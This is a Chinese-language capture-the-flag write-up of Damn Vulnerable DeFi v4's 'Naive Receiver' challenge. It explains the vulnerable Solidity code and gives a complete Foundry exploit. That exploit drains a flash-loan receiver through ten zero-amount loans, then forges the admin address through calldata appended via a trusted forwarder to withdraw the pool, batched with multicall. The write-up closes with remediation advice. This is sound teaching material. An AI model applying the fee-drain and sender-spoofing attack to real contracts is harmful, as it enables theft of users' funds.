# Naive Receiver

## 一、题目概述

本题为 Damn Vulnerable DeFi v4 第二题。

合约组件说明：

1. **NaiveReceiverPool**：闪电贷资金池，存有 1000 WETH，提供闪电贷、提款、批量调用功能

2. **FlashLoanReceiver**：闪电贷回调接收合约，自带 10 WETH，用于支付闪电贷手续费

3. **BasicForwarder**：官方可信转发器，用于处理 EIP712 签名元交易

4. **Multicall**：批量调用抽象合约，支持单次交易执行多段逻辑

**通关要求**：

1. 清空 `FlashLoanReceiver` 全部 10 WETH

2. 清空资金池全部 1000 WETH

3. 所有资金汇总转入 recovery 地址

4. 攻击者交易数量 ≤ 2（nonce ≤ 2）

## 二、考察核心

本题属于**业务逻辑设计缺陷 \+ 权限绕过**：

1. **闪电贷费用逻辑漏洞**：手续费固定，与借贷资产数量解耦

2. **无条件扣费机制**：任意用户可指定目标合约支付手续费

3. **Multicall\+元交易组合利用**：压缩交易次数，满足题目限制

## 三、审计扫洞流程（通用思路）

拿到合约无需读全文，审计刷题固定关键词扫描法，精准定位：

### 1\. 定向搜索业务关键词

闪电贷题目关键词：`flashFee`、`flashLoan`、`\_msgSender`、`multicall`

### 2\. 逐一定位高危代码与思考推导

**漏洞点1：固定手续费（核心根源）**

```solidity
function flashFee(address token, uint256) external view returns (uint256) {
    if (token != address(weth)) revert UnsupportedCurrency();
    return FIXED_FEE;
}
```

思考：函数第二个入参（借贷金额）未被使用，**无论借贷 0 或是 1000 WETH，手续费永久固定为 1 WETH**。存在无效借贷扣费漏洞。

**漏洞点2：无权限限制，任意用户发起闪电贷**

```solidity
function flashLoan(IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data)
    external
    returns (bool)

```

思考：函数仅修饰`external`，无任何权限校验，**任何人都可以调用闪电贷，并指定任意接收合约**。

**漏洞点3：手续费由接收方合约支付，而非调用者**

```solidity
weth.transferFrom(address(receiver), address(this), amountWithFee);
```

思考：扣费对象为 `receiver` 合约，攻击者可强制 `FlashLoanReceiver` 消耗自身余额支付手续费。该合约仅有 10 WETH，最多可被扣除 10 次手续费，直接掏空。

**漏洞点4：自定义 \_msgSender 身份伪造**

```solidity
function _msgSender() internal view override returns (address) {
    if (msg.sender == trustedForwarder && msg.data.length >= 20) {
        return address(bytes20(msg.data[msg.data.length - 20:]));
    } else {
        return super._msgSender();
    }
}
```

思考：如果通过可信转发器发起调用，合约会读取 **calldata 最后20字节** 作为调用者地址。攻击者可拼接管理员地址，**伪造 deployer 身份**，调用仅管理员可用的 `withdraw` 提款函数。

**漏洞点5：Multicall 批量调用**

合约继承 `Multicall`，支持单次交易执行多组函数调用，可将10次闪电贷\+1次提款打包，满足交易数限制。

## 四、完整漏洞原理

1. 资金池闪电贷手续费固定为 1 WETH，支持 **借贷金额为 0**，无需归还资产但必须支付手续费；

2. 手续费由闪电贷接收合约承担，攻击者可强制目标 `FlashLoanReceiver` 扣费，10 次零额闪电贷即可掏空其 10 WETH 余额；

3. 提款函数 `withdraw` 依靠 `\_msgSender\(\)` 识别管理员，无硬编码权限校验；

4. 结合 Forwarder 元交易 \+ calldata 拼接地址，伪造管理员身份，调用提款函数掏空资金池 1000 WETH；

5. 通过 Multicall 批量打包所有攻击逻辑，压缩为单笔交易，符合题目 nonce 限制。

## 五、EXP

```solidity
function test_naiveReceiver() public checkSolvedByPlayer {
    // 批量构造11笔调用：10次零额闪电贷 + 1次管理员提款
    bytes[] memory calls = new bytes[](11);
    
    // 10次0金额闪电贷：掏空 receiver 10WETH 手续费
    for (uint256 i = 0; i < 10; i++) {
        calls[i] = abi.encodeCall(
            pool.flashLoan,
            (receiver, address(weth), 0, "")
        );
    }
    
    // 构造提款调用，尾部拼接deployer地址，伪造管理员_msgSender
    calls[10] = abi.encodePacked(
        abi.encodeCall(pool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
        bytes32(uint256(uint160(deployer)))
    );
    
    // 打包批量调用数据
    bytes memory multicallData = abi.encodeCall(pool.multicall, (calls));
    
    // 构造EIP712元交易请求
    BasicForwarder.Request memory req = BasicForwarder.Request({
        from: player,
        target: address(pool),
        value: 0,
        gas: 1e6,
        nonce: forwarder.nonces(player),
        data: multicallData,
        deadline: block.timestamp + 1 hours
    });
    
    // 签名元交易并执行
    bytes32 digest = keccak256(abi.encodePacked(
        "\x19\x01",
        forwarder.domainSeparator(),
        forwarder.getDataHash(req)
    ));
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
    bytes memory sig = abi.encodePacked(r, s, v);
    
    forwarder.execute(req, sig);
}
```

## 六、运行命令与通关结果

### 运行命令

```bash
forge test --match-contract NaiveReceiverChallenge
```

### 通关结果

```Plain Text
[PASS] test_assertInitialState()
[PASS] test_naiveReceiver()
Suite result: ok. 2 passed; 0 failed; 0 skipped
```

## 七、修复方案

1. **修复手续费逻辑**：取消固定手续费，手续费与借贷金额成正比，禁止 0 金额闪电贷；

2. **增加权限校验**：闪电贷仅允许白名单地址调用，禁止任意用户指定第三方合约扣费；

3. **加固身份校验**：`\_msgSender` 禁止通过 calldata 拼接伪造地址，管理员权限硬编码校验；

4. **限制批量调用权限**：multicall 增加管理员权限校验，防止批量执行恶意操作。

## 八、题目总结

本题是 v4 版本**业务逻辑漏洞题**，真实 DeFi 项目高频风险点：不合理的手续费设计、权限校验缺失、自定义上下文伪造。

做题核心逻辑：利用**零借贷扣费**掏空接收合约资金，再利用**元交易身份伪造**绕过管理员权限，最后通过批量调用满足交易限制，完整复现真实 DeFi 项目中链式组合漏洞的攻击链路。

